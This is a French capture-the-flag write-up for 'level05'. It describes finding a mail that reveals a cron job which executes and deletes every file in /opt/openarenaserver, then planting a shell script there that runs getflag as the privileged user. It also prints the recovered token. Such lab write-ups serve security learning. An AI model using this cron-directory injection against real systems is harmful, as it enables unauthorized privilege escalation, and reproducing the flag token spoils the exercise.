# Rapport CTF - [level05]

1. ### Objectif 1 - Recherche du fichier "mail"
   - **Description :** L'épreuve consistait à rechercher le fichier "mail" pour trouver des informations importantes.
   - **Solution :** Les étapes suivantes ont été réalisées :
     - Utilisation de la commande `find / -type d -name "mail" 2> /dev/null` pour trouver le répertoire contenant les fichiers de courrier.
     - Navigation vers le répertoire `/var/mail`.
     - Consultation du contenu du fichier "level05" avec `cat level05`.

2. ### Objectif 2 - Analyse du contenu du mail
   - **Description :** Analyser le contenu du mail pour comprendre les informations relatives à l'exécution d'un programme.
   - **Solution :** Les étapes suivantes ont été suivies :
     - Lecture du contenu du fichier "level05".
     - Identification de la planification de l'exécution du programme "openarenaserver" toutes les 2 minutes.

3. ### Objectif 3 - Analyse du script "openarenaserver"
   - **Description :** Analyser le script "openarenaserver" pour comprendre son fonctionnement.
   - **Solution :** Les étapes suivantes ont été réalisées :
     - Affichage du contenu du script "openarenaserver" avec `cat /usr/sbin/openarenaserver`.
     - Observation que le script exécute tous les programmes dans le répertoire "/opt/openarenaserver" puis les supprime.
     - Vérification des permissions du script (permissions "rwxr-x---+").

4. ### Objectif 4 - Création d'un programme malveillant
   - **Description :** Créer un programme malveillant pour exploiter les privilèges du script "openarenaserver".
   - **Solution :** Les étapes suivantes ont été effectuées :
     - Création d'un nouveau fichier "test.sh" avec `echo > test.sh`.
     - Édition du fichier "test.sh" avec `vim test.sh` et ajout du code suivant :
       ```bash
       #!/bin/bash

       # Commande dont vous souhaitez obtenir le résultat
       commande="getflag"

       # Chemin complet du fichier de sortie dans /tmp
       fichier_sortie="/tmp/resultat.txt"

       # Exécute la commande et redirige la sortie vers le fichier de sortie
       $commande > $fichier_sortie
       ```
     - Attendre que le script "openarenaserver" exécute "test.sh" toutes les 2 minutes.

5. ### Objectif 5 - Obtention du flag
   - **Description :** Obtenir le flag en exécutant le programme malveillant "test.sh".
   - **Solution :** Les étapes suivantes ont été réalisées :
     - Navigation vers le répertoire "/tmp".
     - Affichage du contenu du fichier "resultat.txt" avec `cat resultat.txt` pour obtenir le token : "viuaaale9huek52boumoomioc".
